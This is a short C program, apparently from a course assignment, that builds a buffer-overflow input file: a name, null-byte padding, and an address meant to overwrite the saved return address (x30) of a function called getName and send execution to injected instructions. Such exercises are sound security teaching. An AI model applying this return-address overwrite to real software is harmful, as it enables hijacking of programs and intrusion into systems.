#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

int main(void){
    int i;
    unsigned long uiData;
    FILE *psFile;
    
    /* address of first machine language instruction in bss */
    uiData = 0x400858;
    psFile = fopen("dataB", "w");
    
    /* puts Chris Paucar in the first 12 spots of text file */
    fprintf(psFile,"Chris Paucar");
    
    /* fills rest of text file with null bytes */
    for(i = 0; i < 36; i++){
        putc('\0', psFile);
    }
    
    /* overwrite x30 of getName with first machine language instruction */
    fwrite(&uiData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
